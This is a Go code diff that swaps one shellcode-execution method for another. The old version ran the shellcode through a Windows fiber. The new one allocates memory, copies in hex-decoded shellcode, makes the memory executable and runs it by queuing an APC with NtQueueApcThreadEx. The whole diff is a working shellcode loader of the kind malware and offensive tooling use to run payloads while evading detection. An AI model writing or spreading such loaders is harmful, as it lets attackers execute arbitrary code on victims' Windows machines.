@@ -1,4 +1,4 @@
-package CreateFiber
+package NtQueueApcThreadEx
 
 import (
 	"encoding/hex"
@@ -14,23 +14,20 @@ const (
 	PageReadwrite   = 0x04
 )
 
-func Createfiber(code string) {
+func Ntqueueapcthreadex(code string) {
 	shellcode, _ := hex.DecodeString(code)
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
-	CreateFiber := kernel32.NewProc("CreateFiber")
-	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
-	fiberAddr, _, _ := ConvertThreadToFiber.Call()
+	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
+	fmt.Println("ok")
 	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	oldProtect := PageReadwrite
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
-	fiber, _, _ := CreateFiber.Call(0, addr, 0)
-	_, _, _ = SwitchToFiber.Call(fiber)
-	_, _, _ = SwitchToFiber.Call(fiberAddr)
-	fmt.Println("ok")
+	thread, _, _ := GetCurrentThread.Call()
+	_, _, _ = NtQueueApcThreadEx.Call(thread, 1, addr, 0, 0, 0)
 }
